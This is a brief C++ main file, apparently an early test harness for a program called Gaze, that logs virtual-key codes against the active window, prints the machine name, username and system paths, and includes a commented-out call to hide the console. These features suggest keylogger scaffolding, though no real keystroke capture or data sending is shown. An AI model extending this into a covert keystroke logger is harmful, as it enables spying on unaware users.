// Gaze.cpp : This file contains the 'main' function. Program execution begins and ends there.
// all .cpp files must

#include "pch.h"
#include "Logger.h"
#include <iostream>

using namespace std;

int main()
{
	// Start Logger instance
	Logger logger;

	// Add 2 dummy log to logger
	logger.Add(Utilities::GetActiveWindow(), VK_ESCAPE);
	logger.Add(Utilities::GetActiveWindow(), VK_HOME);
	
	// Display computer information
	cout << Utilities::GetMachineName() << endl;
	cout << Utilities::GetUsername() << endl;
    cout << Utilities::GetProgramFilePath() << endl;
	cout << Utilities::GetSystemDir() << endl;

	// Display logger content
	cout << logger.GetLog() << endl;

	//Utilities::HideConsole();

	return 0;
}